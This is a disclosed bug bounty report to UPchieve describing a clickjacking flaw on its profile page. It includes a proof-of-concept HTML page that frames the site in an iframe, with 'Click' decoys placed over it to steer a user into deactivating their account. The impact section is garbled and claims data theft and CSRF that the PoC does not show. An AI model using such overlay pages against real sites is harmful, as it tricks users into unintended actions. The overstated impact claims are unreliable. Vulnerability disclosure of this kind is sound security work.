# CLICKJACKING LEADS TO DEACTIVATE ACCOUNT

## Report Details
- **Report ID**: 1301113
- **URL**: https://hackerone.com/reports/1301113
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-08-12T07:03:16.272Z
- **Disclosed**: 2021-08-16T17:21:19.802Z

## Reporter
- **Username**: scianto05
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: upchieve

## Vulnerability Information
Hello UPCHEIVE SECURITY TEAM,

I'm Anto

Vulnerability :
Clickjacking in (https://hackers.upchieve.org/profile)

Steps to Reproduce:
1). Create a HTML file with following code

<!DOCTYPE HTML>
    <html lang="en-US">
    <head>
    <meta charset="UTF-8">
    </head>
    <body>
    <p>Click the place where its shows </p>
    <div style="position: absolute; left: 1150px; top: 180px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 350px; top: 580px; pointer-events: none;">Click 2</div>
    <div style="position: absolute; left: 800px; top: 1650px; pointer-events: none;">Click 2</div>
<iframe height="3000" width="1300" scrolling="no" src="https://hackers.upchieve.org/profile"></iframe>
  </body>   
  </html>

2), Save and Open it on your browser the page will be appear.

## Impact

An attacker can host this domain in other evil site by using iframe and if a user fill the given filed it can directly redirect as logs to attacker and after its redirect to your web server.. its lead to steal user information too and use that host site as phishing of your site its CSRF and Clickjacking.

Regards,
Anto

## Attachments
No attachments
